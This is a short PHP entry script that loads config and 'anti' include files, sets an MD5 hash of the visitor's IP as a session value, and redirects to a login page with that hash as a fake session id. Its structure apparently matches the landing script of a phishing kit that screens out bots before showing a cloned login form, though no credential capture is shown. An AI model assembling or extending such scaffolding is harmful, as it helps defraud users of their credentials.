<?php

include "includes/Config.php";
require "includes/One_Time.php";    

if ($antitype==2)  {
	include "includes/anti2.php";
} else {
	include "includes/anti.php";
}



session_start();

$_SESSION['hash'] = md5($_SERVER['REMOTE_ADDR']);

header("Location: login.php?sessionid=".$_SESSION['hash']);

?>